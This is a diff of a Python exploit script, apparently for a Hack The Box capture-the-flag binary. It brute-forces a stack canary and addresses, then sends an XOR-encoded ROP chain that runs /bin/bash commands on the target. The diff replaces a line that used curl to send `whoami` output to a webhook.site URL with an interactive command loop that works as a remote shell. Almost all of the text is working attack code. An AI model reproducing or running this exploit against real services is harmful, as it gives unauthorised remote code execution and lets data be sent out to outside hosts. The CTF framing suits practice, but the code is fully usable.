@@ -2,9 +2,23 @@ import sys
 import socket
 import struct
 
-_Host = 'docker.hackthebox.eu'
-_Port = 51428
+_Host = '10.0.0.108'
+_Port = 5555
 _Correct_User=struct.pack("Q", 0x780d656469766164)
+
+def _WELCOME():
+    _banner =  "   ____  _     _ _          _     _             \n"
+    _banner += "  / __ \| |   | | |        (_)   | |            \n"
+    _banner += " | |  | | | __| | |__  _ __ _  __| | __ _  ___  \n"
+    _banner += " | |  | | |/ _` | '_ \| '__| |/ _` |/ _` |/ _ \ \n"
+    _banner += " | |__| | | (_| | |_) | |  | | (_| | (_| |  __/ \n"
+    _banner += "  \____/|_|\__,_|_.__/|_|__|_|\__,_|\__, |\___| \n"
+    _banner += "     |  __ \            |__   __|    __/ | |    \n"
+    _banner += "     | |__) |_      ___ __ | | ___  |___/| |    \n"
+    _banner += "     |  ___/\ \ /\ / / '_ \| |/ _ \ / _ \| |    \n"
+    _banner += "     | |     \ V  V /| | | | | (_) | (_) | |    \n"
+    _banner += "     |_|      \_/\_/ |_| |_|_|\___/ \___/|_|    \n"
+    print(_banner)
 
 def reverse(_buffer):
 	return _buffer[::-1]
@@ -16,8 +30,7 @@ def connect():
 	except Exception as e:
 		print("Error! Cannot connect: {0}", str(e))
 		sys.exit(1)
-
-	sock.settimeout(2)
+	
 	return sock
 
 def test_payload(_buffer):
@@ -45,10 +58,12 @@ def brute_force(_Payload):
     while byte_count < 8:
         if count > 255:
             print("[!] WARNING: count > 255\n")
+            count=0
         sock=connect()
         rec=sock.recv(1024)
         _test_byte=struct.pack("B",int(hex(count),16))
         sock.send(_Payload + _to_return + _test_byte)
+        sock.settimeout(5)
         try:
             rec=sock.recv(1024)
         except:
@@ -58,11 +73,13 @@ def brute_force(_Payload):
         if len(rec) > 0:
             byte_count += 1
             _to_return += struct.pack("B",int(hex(count),16))
-            print("[~] found a byte: " + hex(count))
+            sys.stdout.write("\r{0}: {1}/8".format("[*] bytes found", byte_count))
+            sys.stdout.flush()
             count = 0
         else:
             count += 1
-            
+
+    print("")
     return _to_return
 
 class ROP():
@@ -74,13 +91,13 @@ class ROP():
     _pop_RSP_base	= 0x0000000000000f6d	# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
     _leave_ret_base	= 0x0000000000000b6d
     _syscall_base	= 0x0000000000000b55
-    _call_rax_base  = 0x00000000000008e0
-    
+    _call_rax_base  = 0x00000000000008e0    
+
     @staticmethod
     def prepare(largeInt):
         return xor_me(struct.pack("Q", largeInt))
         
-    def __init__(self, ropOffset, stackOffset):
+    def __init__(self, ropOffset, stackOffset, cmdToExec):
         self._pop_RAX = self.prepare(self._pop_RAX_base + ropOffset)
         self._pop_RBP = self.prepare(self._pop_RBP_base + ropOffset)
         self._pop_RDI = self.prepare(self._pop_RDI_base + ropOffset)
@@ -94,8 +111,8 @@ class ROP():
         self._execve_int = self.prepare(0x3b)
         self._JUNK = self.prepare(0xdeadbeefdeadbeef)
         self._NULL = self.prepare(0x0000000000000000)
-        self._ARGS="-c"
-        self._ARG2="curl https://webhook.site/4fbbacd3-eaab-4f78-a760-47bffb7e8ffd/`whoami`"
+        self._ARGS = "-c"
+        self._ARG2 = "echo $(" + cmdToExec + ") 1>&6"
         self._FILENAME="/bin/bash"
         self._FILENAME_address = self.prepare(stackOffset + 120)
         #self._FILENAME_address = self.prepare(0x7ffff7f6c573)
@@ -107,14 +124,15 @@ class ROP():
         self._NULL_address = self.prepare(stackOffset + 16)
 
 def find_canary(_Payload):
-    _canary = brute_force(_Payload)
-    test_payload(_Payload + _canary)
+    print("[+] brute forcing canary")
+    _canary = brute_force(_Payload)    
     _canary_hex = xor_me(reverse(_canary)).hex()
     print("[+] Canary found: {0}".format(_canary.hex()))
     
     return _canary
 
 def find_RBP(_Payload):
+    print("[+] brute forcing RBP")
     _RBP = brute_force(_Payload)
     _RBP_hex = xor_me(reverse(_RBP)).hex()
     print("[+] RBP found: {0}".format(_RBP_hex))
@@ -128,6 +146,7 @@ def find_stack_offset(_RBP):
 	return _stack_offset
 	
 def find_RSP(_Payload, _RBP):
+    print("[+] brute forcing RSP")
     _RSP = brute_force(_Payload + _RBP)
     _RSP_hex = xor_me(reverse(_RSP)).hex()
     print("[+] RSP found: {0}".format(_RSP_hex))
@@ -148,7 +167,9 @@ def string_to_payload(_STRING):
 	return _to_return
 
 def pwn():
-    _Payload = _Correct_User + "A".encode("utf-8") * 1024
+    _WELCOME()
+
+    _Payload = _Correct_User + "A".encode("utf-8") * 1024    
     _canary = find_canary(_Payload)
     _Payload += _canary
     
@@ -165,72 +186,76 @@ def pwn():
     _rop_offset = find_rop_offset(_RSP)
     
     ## make a ROP object and add to chain
-    myRop = ROP(_rop_offset, _stack_offset)
-    _Payload = _Correct_User 
-    _Payload += myRop._JUNK
-    _Payload += myRop._pop_RAX
-    _Payload += myRop._execve_int
-    _Payload += myRop._pop_RSI
-    _Payload += myRop._Ptr_To_FILENAME_address
-    _Payload += myRop._JUNK
-    _Payload += myRop._pop_RDI
-    _Payload += myRop._FILENAME_address
-    _Payload += myRop._pop_RDX
-    _Payload += myRop._NULL
-    _Payload += myRop._syscall
-    _Payload += myRop._FILENAME_address
-    _Payload += myRop._ARGS_address
-    _Payload += myRop._ARG2_address
-    _Payload += myRop._NULL
-    _Payload += string_to_payload(myRop._FILENAME)
-    _Payload += string_to_payload(myRop._ARGS)
-    _Payload += string_to_payload(myRop._ARG2)
-    _Payload += "A".encode("utf-8") * (1032 - len(_Payload))
-    
-    _Payload += _canary
-    _Payload += xor_me(struct.pack("Q", _stack_offset))
-    _Payload += myRop._leave_ret
+    while True:
+        _CMD = input("CMD> ")
+        if _CMD == "quit":
+            break  
+        myRop = ROP(_rop_offset, _stack_offset, _CMD)
+        _Payload = _Correct_User 
+        _Payload += myRop._JUNK
+        _Payload += myRop._pop_RAX
+        _Payload += myRop._execve_int
+        _Payload += myRop._pop_RSI
+        _Payload += myRop._Ptr_To_FILENAME_address
+        _Payload += myRop._JUNK
+        _Payload += myRop._pop_RDI
+        _Payload += myRop._FILENAME_address
+        _Payload += myRop._pop_RDX
+        _Payload += myRop._NULL
+        _Payload += myRop._syscall
+        _Payload += myRop._FILENAME_address
+        _Payload += myRop._ARGS_address
+        _Payload += myRop._ARG2_address
+        _Payload += myRop._NULL
+        _Payload += string_to_payload(myRop._FILENAME)
+        _Payload += string_to_payload(myRop._ARGS)
+        _Payload += string_to_payload(myRop._ARG2)
+        _Payload += "A".encode("utf-8") * (1032 - len(_Payload))    
+        _Payload += _canary
+        _Payload += xor_me(struct.pack("Q", _stack_offset))
+        _Payload += myRop._leave_ret
 	
-	## fire!
-    test_payload(_Payload)
+	    ## fire!
+        test_payload(_Payload)
 	
 def test():
-    _rop_offset = int('555555554000', 16)
-    _stack_offset = int('7fffffffdd08', 16)
-    myRop = ROP(_rop_offset, _stack_offset)
+    _rop_offset = int('561a2e167000', 16)
+    _stack_offset = int('7ffc8b671f48', 16)
+    _canary = struct.pack("Q", 0x0d450f949331fb0d)
     
-    _Payload = _Correct_User 
-    _Payload += myRop._JUNK
-    _Payload += myRop._pop_RAX
-    _Payload += myRop._execve_int
-    _Payload += myRop._pop_RSI
-    _Payload += myRop._Ptr_To_FILENAME_address
-    _Payload += myRop._JUNK
-    _Payload += myRop._pop_RDI
-    _Payload += myRop._FILENAME_address
-    _Payload += myRop._pop_RDX
-    _Payload += myRop._NULL
-    _Payload += myRop._syscall
-    _Payload += myRop._FILENAME_address
-    _Payload += myRop._ARGS_address
-    _Payload += myRop._ARG2_address
-    _Payload += myRop._NULL
-    _Payload += string_to_payload(myRop._FILENAME)
-    _Payload += string_to_payload(myRop._ARGS)
-    _Payload += string_to_payload(myRop._ARG2)
-    _Payload += "A".encode("utf-8") * (1032 - len(_Payload))
-    
-    _canary = find_canary(_Payload)
-    _Payload += _canary
-    _Payload += xor_me(struct.pack("Q", _stack_offset))
-    _Payload += myRop._leave_ret
-    
-    ## wait for it..
-    print("[!] Time for debugger stuff")
-    junk = input()
-    
-    ## fire!
-    test_payload(_Payload)
+    test_payload(_Correct_User + "A".encode("utf-8") * 1024 + _canary)
+
+    while True:
+        _CMD = input("CMD> ")
+        if _CMD == "quit":
+            break  
+        myRop = ROP(_rop_offset, _stack_offset, _CMD)
+        _Payload = _Correct_User 
+        _Payload += myRop._JUNK
+        _Payload += myRop._pop_RAX
+        _Payload += myRop._execve_int
+        _Payload += myRop._pop_RSI
+        _Payload += myRop._Ptr_To_FILENAME_address
+        _Payload += myRop._JUNK
+        _Payload += myRop._pop_RDI
+        _Payload += myRop._FILENAME_address
+        _Payload += myRop._pop_RDX
+        _Payload += myRop._NULL
+        _Payload += myRop._syscall
+        _Payload += myRop._FILENAME_address
+        _Payload += myRop._ARGS_address
+        _Payload += myRop._ARG2_address
+        _Payload += myRop._NULL
+        _Payload += string_to_payload(myRop._FILENAME)
+        _Payload += string_to_payload(myRop._ARGS)
+        _Payload += string_to_payload(myRop._ARG2)
+        _Payload += "A".encode("utf-8") * (1032 - len(_Payload))    
+        _Payload += _canary
+        _Payload += xor_me(struct.pack("Q", _stack_offset))
+        _Payload += myRop._leave_ret
+	
+	    ## fire!
+        test_payload(_Payload)
 
 def main():
     pwn()
@@ -240,3 +265,4 @@ def main():
 
 if __name__ == '__main__':
 	sys.exit(main())
+
